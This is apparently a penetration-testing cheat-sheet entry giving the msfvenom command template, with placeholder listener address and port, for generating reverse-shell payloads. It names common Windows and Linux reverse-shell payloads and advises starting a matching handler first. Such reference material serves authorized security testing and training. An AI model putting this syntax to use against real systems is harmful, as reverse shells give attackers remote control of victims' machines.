---
id: msfvenom-msfvenom-core-syntax
source: seed
kind: command_syntax
tool: msfvenom
title: "msfvenom core syntax"
tags: ["msfvenom", "payload", "revshell", "arsenal"]
---
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <exe|elf|raw|ps1> -o <file>. Common: windows/meterpreter/reverse_tcp, linux/x64/shell_reverse_tcp, windows/x64/powershell_reverse_tcp. Arch must match target. Pair EVERY payload with a matching handler started FIRST.
